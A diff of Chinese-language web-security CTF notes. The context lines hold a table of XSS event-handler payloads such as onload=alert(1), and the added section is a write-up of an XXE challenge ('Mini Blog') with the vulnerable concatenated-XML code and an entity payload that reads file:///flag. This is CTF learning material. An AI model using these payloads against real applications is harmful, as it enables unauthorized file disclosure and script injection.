@@ -11,7 +11,7 @@ tags: [WEB]
 
 
 
-## 标签的内置事件:
+## 标签的内置事件：
 
 | **标签类型**  | **常用 Payload 示例**                                   | **触发事件**  | **触发条件 / 原理**                          | **优点与局限性**                                     |
 | ------------- | ------------------------------------------------------- | ------------- | -------------------------------------------- | ---------------------------------------------------- |
@@ -28,6 +28,104 @@ tags: [WEB]
 |               | `<select onchange=alert(1)><option>1</option></select>` | `onchange`    | 下拉框选项改变时触发。                       | 需要用户操作。                                       |
 | **动画/其他** | `<marquee onstart=alert(1)>X</marquee>`                 | `onstart`     | 跑马灯动画开始时触发。                       | 老旧但好用（部分新浏览器已弃用）。                   |
 |               | `<body onload=alert(1)>`                                | `onload`      | 整个页面加载完成时触发。                     | 仅限注入点能影响到 `<body>` 标签属性时。             |
+
+
+
+----
+
+
+
+## XML 外部实体注入漏洞：
+
+原题：**SHCTF--hallenge Info** **-** **[阶段2] Mini Blog**
+
+源码：
+
+```
+var xmlData = '<?xml version="1.0" encoding="UTF-8"?><post><title>' + title + '</title><content>' + content + '</content></post>';
+fetch('/create', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/xml' },
+    body: xmlData
+});
+```
+
+期待以post的方法发送xml的数据，而数据是拼接起来的，导致我们可以构造一些恶意的XML的数据直接进入后端，而不被拦截。
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE post [
+  <!ENTITY xxe SYSTEM "file:///flag">
+]>
+<post>
+  <title>hack</title>
+  <content>&xxe;</content>
+</post>
+```
+
+构造的xml数据。
+
+以system的形式去读取flag文件。
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
